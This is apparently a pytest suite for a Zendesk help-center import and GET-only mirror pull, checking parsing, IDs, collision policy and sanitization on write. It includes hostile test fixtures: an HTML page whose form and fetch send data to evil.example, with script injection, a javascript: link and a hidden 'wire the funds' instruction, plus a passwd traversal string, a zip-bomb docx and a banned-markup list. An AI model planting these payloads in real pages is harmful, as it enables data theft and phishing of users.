"""WS2 — Zendesk mirror file import + GET-only API pull.

Locks: the full parser behavior table (envelopes / arrays / single objects
/ .html / doc_reader docs / hostile files), the deterministic NEGATIVE
synthetic-id formula and its stability across re-imports, the pull-origin
collision policy (the mirror is authoritative — imports never replace a
differing pulled baseline), per-file error isolation, and pull_mirror's
GET-only network contract including the new sections/categories client
endpoints and their paged variants. The parser must NEVER raise: every
failure is a per-file error string in the report.

Also locked: the STORE-BOUNDARY SANITIZE. Everything this module writes
goes in through upserts with origin='import', which sanitize body_html and
HTML-bearing macro action values at the write — a file is untrusted input
and mirror bytes are copy-exact material. ``origin='pull'`` is the one
documented exception (byte-faithful mirror), handled honestly downstream
by src/services/zendesk_web.py rather than by silent rewriting.
"""

import hashlib
import json
import os
import urllib.error

import pytest

from src.data import zendesk_import, zendesk_store
from src.data.html_sanitize import sanitize_html


# ── shared helpers ───────────────────────────────────────────────────

class _Resp:
    def __init__(self, payload):
        self._p = json.dumps(payload).encode()
    def read(self):
        return self._p
    def __enter__(self):
        return self
    def __exit__(self, *a):
        return False


@pytest.fixture()
def client():
    from src.data.zendesk_client import ZendeskClient
    return ZendeskClient("acme", "agent@acme.com", "key123")


def _install(monkeypatch, handler):
    import src.data.zendesk_client as zc
    monkeypatch.setattr(zc.urllib.request, "urlopen",
                        lambda req, timeout=0: handler(req))


def _write(tmp_path, name, content):
    p = tmp_path / name
    if isinstance(content, bytes):
        p.write_bytes(content)
    else:
        p.write_text(content, encoding="utf-8")
    return str(p)


def _expected_synthetic(source_ref: str) -> int:
    return -int(hashlib.sha256(source_ref.encode("utf-8")).hexdigest()[:15], 16)


# ── new client GETs: URL/parse contracts ─────────────────────────────

class TestClientTaxonomyGets:
    def test_get_sections_url_and_parse(self, client, monkeypatch):
        seen = {}
        def handler(req):
            seen["url"] = req.full_url
            seen["method"] = req.get_method()
            seen["data"] = req.data
            return _Resp({"sections": [{"id": 9, "name": "FAQ"}]})
        _install(monkeypatch, handler)
        secs = client.get_sections()
        assert secs[0]["id"] == 9
        assert "/help_center/en-us/sections.json?per_page=100" in seen["url"]
        assert seen["method"] == "GET" and seen["data"] is None

    def test_get_categories_url_and_parse(self, client, monkeypatch):
        seen = {}
        def handler(req):
            seen["url"] = req.full_url
            seen["method"] = req.get_method()
            seen["data"] = req.data
            return _Resp({"categories": [{"id": 1, "name": "General"}]})
        _install(monkeypatch, handler)
        cats = client.get_categories(locale="de")
        assert cats[0]["id"] == 1
        assert "/help_center/de/categories.json?per_page=100" in seen["url"]
        assert seen["method"] == "GET" and seen["data"] is None

    def test_get_sections_paged_follows_next_page(self, client, monkeypatch):
        calls = []
        def handler(req):
            calls.append(req.full_url)
            if len(calls) == 1:
                return _Resp({"sections": [{"id": 1}], "count": 2,
                              "next_page": "https://acme.zendesk.com/api/v2/"
                                           "help_center/en-us/sections.json?page=2"})
            return _Resp({"sections": [{"id": 2}], "next_page": None})
        _install(monkeypatch, handler)
        items, total = client.get_sections_paged()
        assert [i["id"] for i in items] == [1, 2]
        assert total == 2 and len(calls) == 2

    def test_get_categories_paged_reports_true_total(self, client, monkeypatch):
        _install(monkeypatch, lambda req: _Resp(
            {"categories": [{"id": 1}], "count": 300, "next_page": None}))
        items, total = client.get_categories_paged()
        assert len(items) == 1 and total == 300

    def test_import_module_never_references_write_methods(self):
        import inspect
        src = inspect.getsource(zendesk_import)
        for name in ("create_article", "update_article", "create_macro",
                     "update_macro", "_write"):
            assert name not in src


# ── sniff_payload ────────────────────────────────────────────────────

class TestSniff:
    @pytest.mark.parametrize("payload,kind", [
        ({"articles": []}, "articles"),
        ({"macros": []}, "macros"),
        ({"sections": []}, "sections"),
        ({"categories": []}, "categories"),
        ({"articles": [], "sections": [], "categories": []}, "articles"),
        ({"title": "T", "body": "b"}, "article"),
        ({"title": "T", "body_html": "<p>b</p>"}, "article"),
        ({"name": "M", "actions": []}, "macro"),
        ({"title": "M", "actions": []}, "macro"),
        ([{"id": 1, "title": "T", "body": "b"}], "articles"),
        ([{"id": 1, "title": "T"}], "articles"),
        ([{"id": 1, "title": "M", "actions": []}], "macros"),
        ([{"id": 9, "category_id": 1, "name": "FAQ"}], "sections"),
        ([{"id": 1, "name": "General", "position": 0}], "categories"),
        ("nope", "unknown"),
        (42, "unknown"),
        (None, "unknown"),
        (True, "unknown"),
        ([], "unknown"),
        ([1, 2, 3], "unknown"),
        ({"weird": 1}, "unknown"),
        ({"articles": "not-a-list"}, "unknown"),
    ])
    def test_sniff(self, payload, kind):
        assert zendesk_import.sniff_payload(payload) == kind


# ── parser table: JSON shapes ────────────────────────────────────────

class TestJsonImport:
    def test_envelope_articles_sections_categories(self, empty_db, tmp_path):
        conn = empty_db.conn
        payload = {
            "articles": [{"id": 11, "title": "SSO", "body": "<p>one</p>",
                          "section_id": 9, "label_names": ["sso"]}],
            "sections": [{"id": 9, "category_id": 1, "name": "FAQ"}],
            "categories": [{"id": 1, "name": "General", "position": 0}],
        }
        path = _write(tmp_path, "export.json", json.dumps(payload))
        rep = zendesk_import.import_file(conn, path)
        assert rep["kind"] == "articles"
        assert rep["imported"] == 3 and not rep["errors"]
        row = conn.execute(
            "SELECT origin, source_file, body_html, body_text "
            "FROM zendesk_articles WHERE article_id=11").fetchone()
        assert row[0] == "import"
        assert row[1] == os.path.abspath(path)
        assert row[2] == "<p>one</p>" and row[3] == "one"
        assert conn.execute("SELECT origin FROM zendesk_sections "
                            "WHERE section_id=9").fetchone()[0] == "import"
        assert conn.execute("SELECT origin FROM zendesk_categories "
                            "WHERE category_id=1").fetchone()[0] == "import"

    def test_envelope_macros(self, empty_db, tmp_path):
        conn = empty_db.conn
        payload = {"macros": [{"id": 201, "title": "Reset",
                               "actions": [{"field": "comment_value",
                                            "value": "hi"}]}]}
        path = _write(tmp_path, "macros.json", json.dumps(payload))
        rep = zendesk_import.import_file(conn, path)
        assert rep["kind"] == "macros" and rep["imported"] == 1
        row = conn.execute("SELECT name, actions_text, origin FROM "
                           "zendesk_macros WHERE macro_id=201").fetchone()
        assert row[0] == "Reset" and "comment_value hi" in row[1]
        assert row[2] == "import"

    def test_array_of_articles(self, empty_db, tmp_path):
        path = _write(tmp_path, "arts.json", json.dumps(
            [{"id": 1, "title": "A", "body": "<p>a</p>"},
             {"id": 2, "title": "B", "body": "<p>b</p>"}]))
        rep = zendesk_import.import_file(empty_db.conn, path)
        assert rep["kind"] == "articles" and rep["imported"] == 2

    def test_array_of_macros(self, empty_db, tmp_path):
        path = _write(tmp_path, "macs.json", json.dumps(
            [{"id": 5, "title": "M1", "actions": [{"field": "status",
                                                   "value": "solved"}]}]))
        rep = zendesk_import.import_file(empty_db.conn, path)
        assert rep["kind"] == "macros" and rep["imported"] == 1

    def test_array_of_sections_and_categories(self, empty_db, tmp_path):
        conn = empty_db.conn
        rep = zendesk_import.import_file(conn, _write(
            tmp_path, "secs.json",
            json.dumps([{"id": 9, "category_id": 1, "name": "FAQ"}])))
        assert rep["kind"] == "sections" and rep["imported"] == 1
        rep = zendesk_import.import_file(conn, _write(
            tmp_path, "cats.json",
            json.dumps([{"id": 1, "name": "General", "position": 0}])))
        assert rep["kind"] == "categories" and rep["imported"] == 1

    def test_single_article_object(self, empty_db, tmp_path):
        conn = empty_db.conn
        path = _write(tmp_path, "one.json", json.dumps(
            {"id": 42, "title": "Solo", "body": "<p>s</p>"}))
        rep = zendesk_import.import_file(conn, path)
        assert rep["kind"] == "article" and rep["imported"] == 1
        assert conn.execute("SELECT title FROM zendesk_articles "
                            "WHERE article_id=42").fetchone()[0] == "Solo"

    def test_single_macro_object(self, empty_db, tmp_path):
        conn = empty_db.conn
        path = _write(tmp_path, "onemac.json", json.dumps(
            {"name": "Apology", "actions": [{"field": "comment_value",
                                             "value": "sorry"}]}))
        rep = zendesk_import.import_file(conn, path)
        assert rep["kind"] == "macro" and rep["imported"] == 1
        row = conn.execute("SELECT macro_id, name FROM zendesk_macros").fetchone()
        assert row[0] < 0 and row[1] == "Apology"   # synthetic negative id

    def test_json_entries_without_ids_get_distinct_negative_ids(
            self, empty_db, tmp_path):
        conn = empty_db.conn
        path = _write(tmp_path, "noids.json", json.dumps(
            [{"title": "First", "body": "<p>1</p>"},
             {"title": "Second", "body": "<p>2</p>"}]))
        rep = zendesk_import.import_file(conn, path)
        assert rep["imported"] == 2 and not rep["errors"]
        ids = [r[0] for r in conn.execute(
            "SELECT article_id FROM zendesk_articles").fetchall()]
        assert len(ids) == 2 and all(i < 0 for i in ids)
        assert ids[0] != ids[1]
        # re-import: same ids, nothing changed
        rep2 = zendesk_import.import_file(conn, path)
        assert rep2["skipped_unchanged"] == 2 and rep2["imported"] == 0
        assert conn.execute(
            "SELECT COUNT(*) FROM zendesk_articles").fetchone()[0] == 2


# ── parser table: HTML + doc_reader files ────────────────────────────

class TestFileImport:
    def test_html_title_tag_and_sanitized_body(self, empty_db, tmp_path):
        conn = empty_db.conn
        raw = ("<html><head><title>SSO &amp; SAML</title></head>"
               "<body><h1>Other</h1><p>b</p></body></html>")
        path = _write(tmp_path, "sso.html", raw)
        rep = zendesk_import.import_file(conn, path)
        assert rep["kind"] == "article" and rep["imported"] == 1
        row = conn.execute("SELECT article_id, title, body_html, source_file "
                           "FROM zendesk_articles").fetchone()
        assert row[0] == _expected_synthetic(os.path.abspath(path))
        assert row[0] < 0
        # the title is read from the RAW text (<head>/<title> do not survive
        # the store-boundary sanitize) and stays entity-decoded
        assert row[1] == "SSO & SAML"
        # body_html is the SANITIZED file text (see the module note): the
        # renderable allowlist subset, not the raw bytes
        assert row[2] == sanitize_html(raw)
        assert row[2] == "<h1>Other</h1><p>b</p>"
        assert row[3] == os.path.abspath(path)

    def test_html_h1_fallback_then_filename(self, empty_db, tmp_path):
        conn = empty_db.conn
        path = _write(tmp_path, "h1only.htm",
                      "<body><h1>From H1</h1><p>x</p></body>")
        zendesk_import.import_file(conn, path)
        assert conn.execute(
            "SELECT title FROM zendesk_articles WHERE article_id=?",
            (_expected_synthetic(os.path.abspath(path)),)).fetchone()[0] == "From H1"
        path2 = _write(tmp_path, "bare-page.html", "<p>no headings</p>")
        zendesk_import.import_file(conn, path2)
        assert conn.execute(
            "SELECT title FROM zendesk_articles WHERE article_id=?",
            (_expected_synthetic(os.path.abspath(path2)),)).fetchone()[0] == "bare-page"

    def test_markdown_document(self, empty_db, tmp_path):
        conn = empty_db.conn
        path = _write(tmp_path, "guide.md", "# Onboarding Guide\n\nStep one.")
        rep = zendesk_import.import_file(conn, path)
        assert rep["kind"] == "article" and rep["imported"] == 1
        row = conn.execute("SELECT title, body_html FROM zendesk_articles "
                           "WHERE article_id=?",
                           (_expected_synthetic(os.path.abspath(path)),)).fetchone()
        assert row[0] == "Onboarding Guide"
        assert "<h1>Onboarding Guide</h1>" in row[1]
        assert "<p>Step one.</p>" in row[1]

    def test_txt_without_heading_titles_from_filename(self, empty_db, tmp_path):
        conn = empty_db.conn
        path = _write(tmp_path, "meeting-notes.txt", "plain text body")
        rep = zendesk_import.import_file(conn, path)
        assert rep["imported"] == 1
        assert conn.execute(
            "SELECT title FROM zendesk_articles WHERE article_id=?",
            (_expected_synthetic(os.path.abspath(path)),)
        ).fetchone()[0] == "meeting-notes"

    def test_synthetic_id_stable_and_reimport_updates_same_row(
            self, empty_db, tmp_path):
        conn = empty_db.conn
        path = _write(tmp_path, "doc.html", "<h1>V1</h1><p>one</p>")
        rep1 = zendesk_import.import_file(conn, path)
        assert rep1["imported"] == 1
        rep2 = zendesk_import.import_file(conn, path)
        assert rep2["skipped_unchanged"] == 1 and rep2["imported"] == 0
        _write(tmp_path, "doc.html", "<h1>V2</h1><p>two</p>")
        rep3 = zendesk_import.import_file(conn, path)
        assert rep3["updated"] == 1 and rep3["imported"] == 0
        rows = conn.execute("SELECT article_id, title FROM "
                            "zendesk_articles").fetchall()
        assert len(rows) == 1                       # same row all three times
        assert rows[0][0] == _expected_synthetic(os.path.abspath(path))
        assert rows[0][1] == "V2"


# ── hostile / malformed inputs (never raise) ─────────────────────────

class TestHostileInputs:
    def test_malformed_json_is_a_report_error(self, empty_db, tmp_path):
        path = _write(tmp_path, "bad.json", "{not json{{{")
        rep = zendesk_import.import_file(empty_db.conn, path)
        assert rep["imported"] == 0
        assert any("not valid JSON" in e for e in rep["errors"])

    @pytest.mark.parametrize("payload", ['"just a string"', "42", "true",
                                         "[]", "[1, 2, 3]",
                                         '{"weird": {"nested": 1}}',
                                         '{"articles": "not-a-list"}'])
    def test_wrong_shapes_are_report_errors(self, empty_db, tmp_path, payload):
        path = _write(tmp_path, "shape.json", payload)
        rep = zendesk_import.import_file(empty_db.conn, path)
        assert rep["imported"] == 0
        assert any("unrecognized JSON shape" in e for e in rep["errors"])

    def test_binary_file_is_a_report_error(self, empty_db, tmp_path):
        path = _write(tmp_path, "img.png", b"\x89PNG\x00\x00\x01binary")
        rep = zendesk_import.import_file(empty_db.conn, path)
        assert rep["imported"] == 0 and rep["errors"]

    def test_mislabeled_binary_txt_is_a_report_error(self, empty_db, tmp_path):
        path = _write(tmp_path, "fake.txt", b"\x00\x01\x02\x03 pdf bytes")
        rep = zendesk_import.import_file(empty_db.conn, path)
        assert rep["imported"] == 0 and rep["errors"]

    def test_missing_file_and_traversal_path(self, empty_db):
        rep = zendesk_import.import_file(
            empty_db.conn, os.path.join("..", "..", "no-such-file-xyz.json"))
        assert rep["errors"] == ["file not found"]
        assert rep["imported"] == 0

    def test_traversal_in_content_is_just_a_literal_title(
            self, empty_db, tmp_path):
        conn = empty_db.conn
        path = _write(tmp_path, "trav.json", json.dumps(
            [{"id": 7, "title": "../../../etc/passwd", "body": "<p>x</p>"}]))
        rep = zendesk_import.import_file(conn, path)
        assert rep["imported"] == 1 and not rep["errors"]
        assert conn.execute("SELECT title FROM zendesk_articles WHERE "
                            "article_id=7").fetchone()[0] == "../../../etc/passwd"

    def test_huge_string_values_do_not_raise(self, empty_db, tmp_path):
        big = "x" * (2 * 1024 * 1024)
        path = _write(tmp_path, "big.json", json.dumps(
            [{"id": 8, "title": "big", "body": big}]))
        rep = zendesk_import.import_file(empty_db.conn, path)
        assert rep["imported"] == 1 and not rep["errors"]

    def test_invalid_entries_counted_not_fatal(self, empty_db, tmp_path):
        path = _write(tmp_path, "mixed.json", json.dumps(
            [{"id": 1, "title": "ok", "body": "<p>a</p>"},
             "not-a-dict",
             {"id": "abc", "title": "bad id", "body": "<p>b</p>"}]))
        rep = zendesk_import.import_file(empty_db.conn, path)
        assert rep["imported"] == 1
        assert any("2 invalid entries skipped" in e for e in rep["errors"])

    def test_zip_bomb_docx_refused_before_parsing(
            self, empty_db, tmp_path, monkeypatch):
        """A tiny-on-disk .docx whose members decompress past the 50MB bound
        is refused with a per-file error BEFORE doc_reader ever parses it."""
        import zipfile

        path = str(tmp_path / "bomb.docx")
        with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr("word/document.xml", "0" * (60 * 1024 * 1024))
        assert os.path.getsize(path) < 50 * 1024 * 1024  # passes on-disk check

        def _never_called(*a, **k):
            raise AssertionError("doc_reader ran on a zip-bomb docx")
        import src.data.doc_reader as dr
        monkeypatch.setattr(dr, "read_document", _never_called)

        rep = zendesk_import.import_file(empty_db.conn, path)
        assert rep["imported"] == 0
        assert rep["errors"] == ["docx too large when decompressed (>50MB)"]

    def test_small_docx_passes_the_expansion_guard(self, empty_db, tmp_path):
        """A normal small .docx still imports — the guard only measures."""
        import zipfile

        ns = ('xmlns:w="http://schemas.openxmlformats.org/'
              'wordprocessingml/2006/main"')
        doc = (f'<?xml version="1.0"?><w:document {ns}><w:body>'
               '<w:p><w:r><w:t>Hello docx</w:t></w:r></w:p>'
               '</w:body></w:document>')
        path = str(tmp_path / "ok.docx")
        with zipfile.ZipFile(path, "w") as z:
            z.writestr("word/document.xml", doc)
        rep = zendesk_import.import_file(empty_db.conn, path)
        assert rep["imported"] == 1 and not rep["errors"]

    def test_corrupt_zip_docx_still_a_clean_per_file_error(
            self, empty_db, tmp_path):
        """A .docx that is not a zip falls through the guard to doc_reader's
        own clear per-file error (the pre-existing contract)."""
        path = _write(tmp_path, "fake.docx", b"not a zip at all")
        rep = zendesk_import.import_file(empty_db.conn, path)
        assert rep["imported"] == 0 and rep["errors"]


# ── store-boundary sanitize (VARIANT 3's root cause) ─────────────────

HOSTILE_FILE = (
    "<html><head><title>Payer update</title>"
    '<meta http-equiv="refresh" content="0;url=https://evil.example">'
    "<style>body{background:url(https://evil.example/b)}</style></head>"
    "<body><h1>Payer update</h1><p>Real content.</p>"
    '<script src="https://evil.example/x.js"></script>'
    '<form action="https://evil.example/collect"><input name="ssn"></form>'
    '<object data="https://evil.example/o"></object>'
    '<p onclick="fetch(\'https://evil.example\')">Click</p>'
    '<img src="x" onerror="alert(1)">'
    '<a href="javascript:alert(1)">go</a>'
    '<span style="font-size: 0">Wire the funds first.</span>'
    "</body></html>")

_BANNED = ("<script", "<form", "<input", "<object", "<meta", "<style",
           "onclick", "onerror", "javascript:", "evil.example")


class TestStoreBoundarySanitize:
    """An imported file is attacker-influenced input, and mirror bytes are
    copy-exact material a specialist pastes into live Zendesk by hand. The
    import used to store the file text RAW while the ONLY on-screen view
    (the preview iframe) was sanitized — so script/form/meta markup was
    invisible to the reviewer and still reached the clipboard. Sanitize now
    runs AT THE WRITE for every non-pull origin, so stored bytes ==
    renderable bytes and there is nothing left to hide."""

    def _stored(self, conn, article_id):
        return conn.execute(
            "SELECT body_html FROM zendesk_articles WHERE article_id=?",
            (article_id,)).fetchone()[0]

    def test_html_file_import_stores_no_hostile_markup(self, empty_db,
                                                       tmp_path):
        conn = empty_db.conn
        path = _write(tmp_path, "payer.html", HOSTILE_FILE)
        rep = zendesk_import.import_file(conn, path)
        assert rep["imported"] == 1 and not rep["errors"]
        stored = self._stored(conn, _expected_synthetic(os.path.abspath(path)))
        low = stored.lower()
        for banned in _BANNED:
            assert banned not in low, banned
        assert "Real content." in stored
        assert stored == sanitize_html(stored)          # fixed point

    def test_json_import_stores_no_hostile_markup(self, empty_db, tmp_path):
        conn = empty_db.conn
        path = _write(tmp_path, "export.json", json.dumps(
            {"articles": [{"id": 77, "title": "T", "body_html": HOSTILE_FILE}]}))
        assert zendesk_import.import_file(conn, path)["imported"] == 1
        low = self._stored(conn, 77).lower()
        for banned in _BANNED:
            assert banned not in low, banned

    def test_markdown_document_import_stores_no_hostile_markup(self, empty_db,
                                                               tmp_path):
        # markdown_to_html forwards raw HTML blocks, so a .md file is just
        # as good a carrier as a .html one
        conn = empty_db.conn
        path = _write(tmp_path, "guide.md",
                      "# Guide\n\nReal content.\n\n" + HOSTILE_FILE + "\n")
        assert zendesk_import.import_file(conn, path)["imported"] == 1
        low = self._stored(
            conn, _expected_synthetic(os.path.abspath(path))).lower()
        for banned in _BANNED:
            assert banned not in low, banned

    def test_imported_macro_reply_html_is_sanitized(self, empty_db, tmp_path):
        conn = empty_db.conn
        path = _write(tmp_path, "macros.json", json.dumps({"macros": [
            {"id": 900, "title": "Reply",
             "actions": [{"field": "comment_value_html",
                          "value": '<p>Hi</p><script>x()</script>'},
                         {"field": "set_tags", "value": "vip < 3"}]}]}))
        assert zendesk_import.import_file(conn, path)["imported"] == 1
        actions = zendesk_store.get_macro(conn, 900)["actions"]
        assert "<script" not in actions[0]["value"].lower()
        assert "<p>Hi</p>" in actions[0]["value"]
        # a plain-text action value is NOT html and must not be mangled
        assert actions[1] == {"field": "set_tags", "value": "vip < 3"}

    def test_reimport_is_idempotent_after_sanitize(self, empty_db, tmp_path):
        """The content hash is computed over the SANITIZED form, so the
        same file re-imports as 'unchanged' instead of thrashing the row."""
        conn = empty_db.conn
        path = _write(tmp_path, "payer.html", HOSTILE_FILE)
        assert zendesk_import.import_file(conn, path)["imported"] == 1
        rep = zendesk_import.import_file(conn, path)
        assert rep["skipped_unchanged"] == 1
        assert rep["imported"] == 0 and rep["updated"] == 0

    def test_pull_origin_bytes_stay_verbatim(self, empty_db):
        """The ONE documented exception: the mirror is byte-faithful to
        remote Zendesk. Pulled bytes are NOT rewritten — they are made
        honest at review/copy time instead (zendesk_web's body_source +
        markup notice + reviewed-bytes clipboard gate)."""
        conn = empty_db.conn
        zendesk_store.upsert_articles(
            conn, [{"id": 88, "title": "T", "body_html": HOSTILE_FILE}],
            origin="pull")
        assert self._stored(conn, 88) == HOSTILE_FILE
        zendesk_store.upsert_macros(
            conn, [{"id": 88, "title": "M",
                    "actions": [{"field": "comment_value_html",
                                 "value": "<script>x()</script>"}]}],
            origin="pull")
        assert (zendesk_store.get_macro(conn, 88)["actions"][0]["value"]
                == "<script>x()</script>")


# ── pull-origin collision policy ─────────────────────────────────────

class TestPullOriginCollisions:
    def _seed_pull_article(self, conn):
        zendesk_store.upsert_articles(
            conn, [{"id": 101, "title": "SSO", "body_html": "<p>pull</p>"}],
            origin="pull")

    def test_import_differing_hash_refused(self, empty_db, tmp_path):
        conn = empty_db.conn
        self._seed_pull_article(conn)
        path = _write(tmp_path, "clash.json", json.dumps(
            [{"id": 101, "title": "SSO", "body": "<p>tampered</p>"}]))
        rep = zendesk_import.import_file(conn, path)
        assert rep["conflicts"] == [101]
        assert rep["imported"] == 0 and rep["updated"] == 0
        row = conn.execute("SELECT body_html, origin FROM zendesk_articles "
                           "WHERE article_id=101").fetchone()
        assert row[0] == "<p>pull</p>" and row[1] == "pull"  # bytes untouched

    def test_import_matching_hash_counts_skipped(self, empty_db, tmp_path):
        conn = empty_db.conn
        self._seed_pull_article(conn)
        path = _write(tmp_path, "same.json", json.dumps(
            [{"id": 101, "title": "SSO", "body": "<p>pull</p>"}]))
        rep = zendesk_import.import_file(conn, path)
        assert rep["skipped_unchanged"] == 1 and rep["conflicts"] == []

    def test_import_import_collision_upserts(self, empty_db, tmp_path):
        conn = empty_db.conn
        p1 = _write(tmp_path, "v1.json", json.dumps(
            [{"id": 555, "title": "T", "body": "<p>v1</p>"}]))
        p2 = _write(tmp_path, "v2.json", json.dumps(
            [{"id": 555, "title": "T", "body": "<p>v2</p>"}]))
        assert zendesk_import.import_file(conn, p1)["imported"] == 1
        rep = zendesk_import.import_file(conn, p2)
        assert rep["updated"] == 1 and rep["conflicts"] == []
        assert conn.execute("SELECT body_html FROM zendesk_articles WHERE "
                            "article_id=555").fetchone()[0] == "<p>v2</p>"

    def test_macro_pull_origin_collision_refused(self, empty_db, tmp_path):
        conn = empty_db.conn
        zendesk_store.upsert_macros(
            conn, [{"id": 201, "title": "Reset",
                    "actions": [{"field": "comment_value", "value": "hi"}]}],
            origin="pull")
        path = _write(tmp_path, "mclash.json", json.dumps(
            {"macros": [{"id": 201, "title": "Reset",
                         "actions": [{"field": "comment_value",
                                      "value": "TAMPERED"}]}]}))
        rep = zendesk_import.import_file(conn, path)
        assert rep["conflicts"] == [201]
        assert "hi" in conn.execute(
            "SELECT actions_text FROM zendesk_macros WHERE macro_id=201"
        ).fetchone()[0]


# ── batches + folders ────────────────────────────────────────────────

class TestBatches:
    def test_per_file_error_isolation(self, empty_db, tmp_path):
        good = _write(tmp_path, "good.json", json.dumps(
            [{"id": 1, "title": "ok", "body": "<p>a</p>"}]))
        bad = _write(tmp_path, "bad.json", "{{{")
        out = zendesk_import.import_paths(empty_db.conn, [bad, good])
        assert out["ok"] is True and len(out["files"]) == 2
        assert out["files"][0]["errors"] and out["files"][0]["imported"] == 0
        assert out["files"][1]["imported"] == 1 and not out["files"][1]["errors"]
        assert out["totals"]["files"] == 2
        assert out["totals"]["imported"] == 1 and out["totals"]["errors"] == 1

    def test_import_paths_empty(self, empty_db):
        out = zendesk_import.import_paths(empty_db.conn, [])
        assert out["ok"] is True and out["files"] == []
        assert out["totals"]["files"] == 0

    def test_import_folder_scans_supported_extensions_only(
            self, empty_db, tmp_path):
        _write(tmp_path, "a.json", json.dumps(
            [{"id": 1, "title": "A", "body": "<p>a</p>"}]))
        _write(tmp_path, "b.md", "# B\n\nbody")
        _write(tmp_path, "c.html", "<h1>C</h1>")
        _write(tmp_path, "ignore.exe", b"MZ\x00\x00")
        (tmp_path / "subdir").mkdir()
        out = zendesk_import.import_folder(empty_db.conn, str(tmp_path))
        assert out["ok"] is True
        assert out["totals"]["files"] == 3
        assert out["totals"]["imported"] == 3
        scanned = {os.path.basename(f["file"]) for f in out["files"]}
        assert scanned == {"a.json", "b.md", "c.html"}

    def test_import_folder_missing_is_graceful(self, empty_db, tmp_path):
        out = zendesk_import.import_folder(
            empty_db.conn, str(tmp_path / "nope"))
        assert out == {"ok": False, "error": "folder_not_found", "files": [],
                       "totals": {"files": 0, "imported": 0, "updated": 0,
                                  "skipped_unchanged": 0, "conflicts": 0,
                                  "errors": 0}}


# ── pull_mirror (mock-verified; every request must be a GET) ─────────

class TestPullMirror:
    def _mk_client(self):
        from src.data.zendesk_client import ZendeskClient
        return ZendeskClient("acme", "agent@acme.com", "key123")

    def _families_handler(self, requests):
        def handler(req):
            requests.append(req)
            url = req.full_url
            if "categories.json" in url:
                return _Resp({"categories": [
                    {"id": 1, "name": "General", "position": 0}]})
            if "sections.json" in url:
                return _Resp({"sections": [
                    {"id": 9, "category_id": 1, "name": "FAQ"}]})
            if "articles.json" in url:
                return _Resp({"articles": [
                    {"id": 101, "title": "SSO", "body": "<p>b</p>",
                     "section_id": 9}]})
            if "macros.json" in url:
                return _Resp({"macros": [
                    {"id": 201, "title": "Reset",
                     "actions": [{"field": "comment_value", "value": "hi"}]}]})
            raise AssertionError(f"unexpected URL {url}")
        return handler

    def test_pull_all_families_and_get_only(self, empty_db, monkeypatch):
        conn = empty_db.conn
        requests = []
        _install(monkeypatch, self._families_handler(requests))
        out = zendesk_import.pull_mirror(conn, self._mk_client())
        assert out == {"ok": True, "articles": 1, "macros": 1, "sections": 1,
                       "categories": 1, "truncated": False}
        assert requests, "no requests captured"
        for req in requests:                       # EVERY request is a GET
            assert req.get_method() == "GET"
            assert req.data is None
        urls = [r.full_url for r in requests]
        assert any("/help_center/en-us/categories.json" in u for u in urls)
        assert any("/help_center/en-us/sections.json" in u for u in urls)
        assert any("/help_center/en-us/articles.json" in u for u in urls)
        assert any("/macros.json" in u for u in urls)
        # rows landed with origin='pull'
        assert conn.execute("SELECT origin FROM zendesk_articles WHERE "
                            "article_id=101").fetchone()[0] == "pull"
        assert conn.execute("SELECT origin FROM zendesk_macros WHERE "
                            "macro_id=201").fetchone()[0] == "pull"
        assert conn.execute("SELECT name FROM zendesk_sections WHERE "
                            "section_id=9").fetchone()[0] == "FAQ"
        assert conn.execute("SELECT name FROM zendesk_categories WHERE "
                            "category_id=1").fetchone()[0] == "General"

    def test_pull_uses_paged_variants(self, empty_db, monkeypatch):
        requests = []
        def handler(req):
            requests.append(req)
            url = req.full_url
            if "articles.json" in url and "page=2" not in url:
                return _Resp({"articles": [{"id": 1, "title": "P1",
                                            "body": "<p>1</p>"}],
                              "count": 2,
                              "next_page": "https://acme.zendesk.com/api/v2/"
                                           "help_center/en-us/articles.json?page=2"})
            if "articles.json" in url:
                return _Resp({"articles": [{"id": 2, "title": "P2",
                                            "body": "<p>2</p>"}],
                              "next_page": None})
            for key in ("categories", "sections", "macros"):
                if f"{key}.json" in url:
                    return _Resp({key: []})
            raise AssertionError(f"unexpected URL {url}")
        _install(monkeypatch, handler)
        out = zendesk_import.pull_mirror(empty_db.conn, self._mk_client())
        assert out["ok"] is True and out["articles"] == 2
        art_urls = [r.full_url for r in requests if "articles.json" in r.full_url]
        assert len(art_urls) == 2                  # next_page was followed
        for req in requests:
            assert req.get_method() == "GET" and req.data is None

    def test_pull_truncated_when_count_exceeds_fetch(self, empty_db,
                                                     monkeypatch):
        def handler(req):
            url = req.full_url
            if "macros.json" in url:
                return _Resp({"macros": [{"id": 1, "title": "M",
                                          "actions": []}],
                              "count": 250, "next_page": None})
            for key in ("categories", "sections", "articles"):
                if f"{key}.json" in url:
                    return _Resp({key: []})
            raise AssertionError(f"unexpected URL {url}")
        _install(monkeypatch, handler)
        out = zendesk_import.pull_mirror(empty_db.conn, self._mk_client())
        assert out["ok"] is True and out["truncated"] is True

    def test_not_connected_degrades(self, empty_db, monkeypatch):
        import src.data.zendesk_client as zc
        monkeypatch.setattr(zc.ZendeskClient, "from_settings",
                            staticmethod(lambda: None))
        out = zendesk_import.pull_mirror(empty_db.conn, None)
        assert out == {"ok": False, "error": "zendesk_not_connected"}

    def test_network_error_degrades_not_raises(self, empty_db, monkeypatch):
        def handler(req):
            raise urllib.error.URLError("boom")
        _install(monkeypatch, handler)
        out = zendesk_import.pull_mirror(empty_db.conn, self._mk_client())
        assert out["ok"] is False and out["error"]
        assert out["error"] != "zendesk_not_connected"
